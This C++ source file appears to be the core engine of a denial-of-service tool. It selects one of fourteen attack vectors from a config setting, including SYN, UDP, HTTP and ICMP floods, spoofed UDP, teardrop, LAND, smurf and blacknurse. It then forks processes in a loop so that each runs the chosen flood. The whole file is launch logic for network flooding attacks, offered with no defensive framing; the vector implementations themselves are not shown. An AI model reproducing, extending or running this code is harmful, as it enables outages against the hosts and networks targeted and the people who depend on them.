#include "engine.h"
#include "vectors.h"

#include <memory>
#include <unistd.h>

engine::engine(std::shared_ptr<Config> config) {
    std::unique_ptr<Vector> flood{};
    switch(config->vec){
        case TCP_FLOOD:
            flood.reset(new tcp_flood(config));
            break;
        case UDP_FLOOD:
            flood.reset(new udp_flood(config));
            break;
        case NULL_TCP:
            flood.reset(new null_tcp(config));
            break;
        case NULL_UDP:
            flood.reset(new null_udp(config));
            break;
        case HTTP_FLOOD:
            flood.reset(new http_flood(config));
            break;
        case ICMP_FLOOD:
            flood.reset(new icmp_flood(config));
            break;
        case SYN_FLOOD:
            flood.reset(new syn_flood(config));
            break;
        case ACK_FLOOD:
            flood.reset(new ack_flood(config));
            break;
        case FIN_FLOOD:
            flood.reset(new fin_flood(config));
            break;
        case SPOOFED_UDP_FLOOD:
            flood.reset(new spoofed_udp_flood(config));
            break;
        case TEARDROP:
            flood.reset(new teardrop(config));
            break;
        case BLACKNURSE:
            flood.reset(new blacknurse(config));
            break;
        case LAND:
            flood.reset(new land(config));
            break;
        case SMURF:
            flood.reset(new smurf(config));
            break;
        default:
            fputs("[-] invalid Vector selected\n", stderr);
            exit(EXIT_FAILURE);
    }

    for(int i = 0; i < config->trds; ++i){
        if(fork())
            flood->run();
    }
}
